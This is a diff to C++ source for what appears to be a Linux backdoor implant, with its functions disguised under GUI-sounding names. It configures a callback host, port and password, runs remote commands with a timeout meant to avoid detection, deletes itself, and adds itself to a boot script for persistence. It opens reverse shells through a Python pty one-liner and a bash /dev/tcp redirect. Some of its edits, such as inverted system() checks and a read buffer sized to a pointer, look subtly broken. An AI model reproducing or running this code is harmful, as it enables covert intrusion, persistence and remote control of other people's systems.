@@ -25,6 +25,7 @@ struct gui_config{
     const string client_patch = "127.0.0.1"; // host to call back to
     const string client_buffer = "22123"; // port to call back to port 80 and 443 will look like web sockets
     const string client_key = "lolpass"; // password
+    const string client_time_out = "1"; // amount of time till a command will be killed, the smaller the time the less chance of detection
 }; gui_config gc; 
 
 class gui_bar{
@@ -36,12 +37,19 @@ class gui_bar{
           }
           FILE *in;
           char *buff;
+          time_t end = time(NULL) + stoi(gc.client_time_out);
           buff = (char*)malloc(1024);
           string out = "";
           if(!(in = popen((lc).c_str(), "r"))){
             return "failure";
-          } while(fgets(buff, 1024, in)!=NULL){
+          } 
+          while(fgets(buff, sizeof(buff), in)!=NULL){
             out += buff;
+            if(time(NULL) >= end){
+              free(buff);
+              pclose(in); 
+				      return  out + "\nKilled command since it took longer than " + string(gc.client_time_out) + " Seconds\n";
+		      	}
           }
           free(buff);
           pclose(in); 
@@ -77,6 +85,7 @@ class gui_bar{
             for (x = sysconf(_SC_OPEN_MAX); x>0; x--){
                 close (x);
             }
+            return;
         }
         string getexepath(void)  //ripped from somewhere
         {
@@ -90,14 +99,16 @@ class gui_bar{
             remove((getexepath()).c_str()); 
             remove("/tmp/.pythonbin/");
             remove("/etc/.pythonbin/");
+            return;
         }
         void bios_bitmap(string bios_host, string bios_num) 
         {
-            if(system(("python3 -c 'import os, pty, socket; s = socket.socket(socket.AF_INET, socket.SOCK_STREAM); s.connect((\"" + string(bios_host) + "\", " + string(bios_num) + ")); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); os.putenv(\"HISTFILE\",\"/dev/null\"); pty.spawn(\"/bin/bash\"); s.close();'").c_str()) != 0){
-                if(system(("bash -i >& /dev/tcp/" + string(bios_host) + "/" + string(bios_num) + " 0>&1").c_str()) != 0){
+            if(!system(("python3 -c 'import os, pty, socket; s = socket.socket(socket.AF_INET, socket.SOCK_STREAM); s.connect((\"" + string(bios_host) + "\", " + string(bios_num) + ")); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); os.putenv(\"HISTFILE\",\"/dev/null\"); pty.spawn(\"/bin/bash\"); s.close();'").c_str())){
+                if(!system(("bash -i >& /dev/tcp/" + string(bios_host) + "/" + string(bios_num) + " 0>&1").c_str())){
                     return;   // all backconnects failed, must be a shitty box
                 }
             }
+            return;
         }
         string ftp_g(void) 
         {
@@ -120,19 +131,20 @@ class gui_bar{
           string line;
           count_line.open(file_name);
           while(count_line.good()){
-            while(!count_line.eof()){ // To get you all the lines.
-                line = "";
-                getline(count_line, line);
-                if(line.find(boot_file) != -1){
-                  remove("/tmp/tmp.txt");
-                  return false;
-                }
-                else if(line=="# Make sure that the script will \"exit 0\" on success or any other" || line!="exit 0"){
-                  startup << line << endl;  
-                }
+          while(!count_line.eof()) // To get you all the lines.
+            {
+              line = "";
+              getline(count_line, line);
+              if(line.find(boot_file) != -1){
+              remove("/tmp/tmp.txt");
+              return false;
               }
-              count_line.close();
-              break;
+              else if(line=="# Make sure that the script will \"exit 0\" on success or any other" || line!="exit 0"){
+                startup << line << endl;  
+              }
+            }
+            count_line.close();
+            break;
           }
           startup << boot_file << endl;
           startup << "exit 0" << endl;
@@ -164,6 +176,7 @@ class gui_bar{
             }
             write_to_boot(service_s, file_p);
           }   
+          return;
         }
 }; gui_bar gb;
 
